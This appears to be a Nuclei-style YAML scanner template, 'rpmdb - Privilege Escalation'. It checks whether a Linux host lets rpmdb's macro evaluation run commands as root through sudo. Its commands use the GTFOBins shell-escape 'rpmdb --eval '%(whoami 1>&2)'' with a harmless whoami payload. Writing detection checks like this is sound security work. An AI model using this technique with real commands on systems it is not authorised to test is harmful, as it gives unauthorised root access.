code:
- engine:
  - sh
  - bash
  source: 'whoami

    '
- engine:
  - sh
  - bash
  source: 'rpmdb --eval ''%(whoami 1>&2)''

    '
- engine:
  - sh
  - bash
  matchers:
  - negative: true
    part: code_1_response
    type: word
    words:
    - root
  - condition: or
    dsl:
    - contains(code_2_response, "root")
    - contains(code_3_response, "root")
    type: dsl
  matchers-condition: and
  source: 'sudo rpmdb --eval ''%(whoami 1>&2)''

    '
id: privesc-rpmdb
info:
  author: daffainfo
  description: 'The rpmdb is the database used by the RPM Package Manager to store
    metadata about installed packages on a Linux system. It is used to track information
    about installed packages, including their files, dependencies, and other attributes.
    The rpmdb is a critical component of package management on RPM-based Linux distributions.

    '
  metadata:
    max-request: 3
    verified: true
  name: rpmdb - Privilege Escalation
  reference:
  - https://gtfobins.github.io/gtfobins/rpmdb/
  severity: high
  tags: code,linux,rpmdb,privesc,local
self-contained: true
